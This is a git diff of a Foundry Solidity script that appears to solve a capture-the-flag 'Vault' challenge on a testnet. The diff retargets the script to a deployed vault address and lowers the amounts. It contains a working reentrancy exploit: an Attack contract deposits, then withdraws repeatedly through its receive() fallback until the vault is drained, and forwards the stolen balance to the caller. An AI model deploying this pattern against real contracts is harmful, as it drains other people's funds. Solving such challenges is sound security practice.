@@ -7,14 +7,14 @@ import "forge-std/console.sol";
 import {Vault} from "../src/Vault.sol";
 
 contract VaultSolve is Script {
-    Vault public vault = Vault(0x80C30D2FE8e45F588d70bc5D530939c7f1b22f94);
+    Vault public vault = Vault(0x1B3C95A210A8C896b1C14D992600087668cd0174);
     address player = vm.envAddress("PLAYER");
 
-    // Deploy
-    function setUp() external{
-        vault = new Vault{value: 1.7 ether}(player);
-        vm.deal(player, 1 ether);
-    }
+    // // Deploy
+    // function setUp() external{
+    //     vault = new Vault{value: 1.7 ether}(player);
+    //     vm.deal(player, 1 ether);
+    // }
     function run() external{
         vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
         console.log("Vault : ", address(vault));
@@ -24,10 +24,12 @@ contract VaultSolve is Script {
         Attack attack = new Attack(address(vault));
         console.log("Attack balance: ", address(attack).balance);
 
-        attack.exploit{value: 1 ether}();
+        attack.exploit{value: 0.001 ether}();
 
         console.log("Vault balance: ", address(vault).balance);
         console.log("Attack balance: ", address(attack).balance);
+        console.log("Player balance: ", player.balance);
+
 
         vm.stopBroadcast();
     }
@@ -42,15 +44,15 @@ contract Attack{
     }
     function exploit() public payable{
         vault.deposit{value: msg.value}(address(this));
-        vault.withdraw(1 ether);
+        vault.withdraw(0.001 ether);
 
         // I need my testnet tokens back
-        // msg.sender.call{value : address(this).balance}("");
+        msg.sender.call{value : address(this).balance}("");
     }
 
     receive() payable external{
-        if (address(vault).balance >= 1 ether){
-            vault.withdraw(1 ether);
+        if (address(vault).balance >= 0.001 ether){
+            vault.withdraw(0.001 ether);
         }
     }
 }
